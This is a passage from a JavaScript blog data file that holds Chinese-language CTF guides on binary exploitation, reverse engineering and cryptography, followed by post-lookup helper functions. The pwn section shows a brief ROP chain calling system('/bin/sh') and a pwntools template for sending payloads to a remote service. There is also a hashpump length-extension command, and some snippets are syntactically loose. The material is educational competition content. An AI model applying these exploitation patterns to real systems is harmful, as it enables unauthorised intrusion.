\`\`\`

### 4. ROP

\`\`\`python
rop = ROP ELF
rop.call('system', [next(elf.search(b'/bin/sh'))])
\`\`\`

## 工具

### Pwntools

\`\`\`python
from pwn import *

p = remote('ctf.target.com', 1337)
# 或
p = process('./binary')

# 发送payload
p.sendline(payload)

# 接收
print(p.recvline())
\`\`\`

### ROPgadget

\`\`\`bash
ROPgadget --binary target --ropchain
\`\`\`

### GDB 插件

\`\`\`bash
# pwndbg
pwndbg> heap
pwndbg> vis_heap_chunks
\`\`\`

## 解题步骤

1. 文件分析（file, checksec）
2. 反编译分析
3. 找到漏洞点
4. 构造 payload
5. 编写 exploit
    `
  },
  {
    slug: 'ctf-re',
    title: 'CTF 逆向方向指南',
    date: '2026-06-10',
    category: 'ctf',
    subcategory: 'ctf-re',
    tags: ['CTF', '逆向', '竞赛'],
    summary: 'CTF 逆向方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. 简单逆向

\`\`\`
# IDA 反编译
# 分析逻辑
# 编写解密脚本
\`\`\`

### 2. 反调试绕过

\`\`\`c
# ptrace 检测
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
    exit(1);
}

# 时间检测
start = time();
// 代码
end = time();
if (end - start > 1) {
    exit(1);
}
\`\`\`

### 3. 算法还原

\`\`\`
# TEA/XTEA
# RC4
# AES/DES
# 自定义算法
\`\`\`

### 4. 虚拟机

\`\`\`
# 自定义VM
# 分析指令集
# 编写反汇编器
\`\`\`

## 工具

### IDA Pro

\`\`\`
# 快捷键
F5: 反编译
X: 交叉引用
N: 重命名
\`\`\`

### Ghidra

\`\`\`
# 免费替代
# 内置反编译器
\`\`\`

### angr

\`\`\`python
# 符号执行
import angr

p = angr.Project('./binary')
state = p.factory.entry_state()
simgr = p.factory.simgr(state)

# 找到目标地址
simgr.explore(find=0x401234, avoid=0x401256)
\`\`\`

## 解题步骤

1. file 查看文件类型
2. IDA/Ghidra 反编译
3. 分析关键函数
4. 编写解密脚本
    `
  },
  {
    slug: 'ctf-crypto',
    title: 'CTF 密码学方向指南',
    date: '2026-06-07',
    category: 'ctf',
    subcategory: 'ctf-crypto',
    tags: ['CTF', '密码学', '竞赛'],
    summary: 'CTF 密码学方向常见题型和解题思路。',
    content: `
## 常见题型

### 1. 经典密码

\`\`\`
# 凯撒密码
def caesar_decode(text, shift):
    return ''.join(chr((ord(c) - ord('a') - shift) % 26 + ord('a')) for c in text)

# ROT13
text.encode().decode('rot_13')
\`\`\`

### 2. Base64 变种

\`\`\`
# 自定义字符表
# 修改 padding
\`\`\`

### 3. RSA

\`\`\`python
# 小公钥指数
# 共模攻击
# 因数分解
\`\`\`

### 4. AES/DES

\`\`\`python
# ECB 模式攻击
# Padding Oracle
# 已知明文攻击
\`\`\`

### 5. 哈希长度扩展

\`\`\`python
# HashPump 工具
hashpump -s original_sig -d original_data -a append_data -k key_length
\`\`\`

## 工具

### SageMath

\`\`\`python
# 数学计算
from sage.all import *

# 因数分解
factor(n)
\`\`\`

### CyberChef

\`\`\`
# 在线工具
# 编码解码
# 加密解密
\`\`\`

### yafu

\`\`\`bash
# 大数因数分解
yafu "factor(n)"
\`\`\`

## 解题步骤

1. 识别加密方式
2. 分析弱点
3. 编写攻击脚本
4. 解密获取 flag
    `
  },
]

export function getAllPosts() {
  return posts.sort((a, b) => new Date(b.date) - new Date(a.date))
}

export function getPostBySlug(slug) {
  return posts.find(p => p.slug === slug)
}

export function getPostsByCategory(categoryId) {
  return posts.filter(p => p.category === categoryId)
}

export function getPostsBySubcategory(subcategoryId) {
  return posts.filter(p => p.subcategory === subcategoryId)
}

export function getAllTags() {
  const tags = new Set()
  posts.forEach(p => p.tags.forEach(t => tags.add(t)))
  return Array.from(tags)
}

export function getPostsByTag(tag) {
  return posts.filter(p => p.tags.includes(tag))
}

export function searchPosts(query) {
  const lower = query.toLowerCase()
  return posts.filter(p =>
    p.title.toLowerCase().includes(lower) ||
    p.summary.toLowerCase().includes(lower) ||
    p.content.toLowerCase().includes(lower)
  )
}

export function getCategoryById(id) {
  for (const cat of categories) {
    if (cat.id === id) return cat
    const sub = cat.children?.find(c => c.id === id)
    if (sub) return { ...sub, parent: cat }
  }
  return null
}
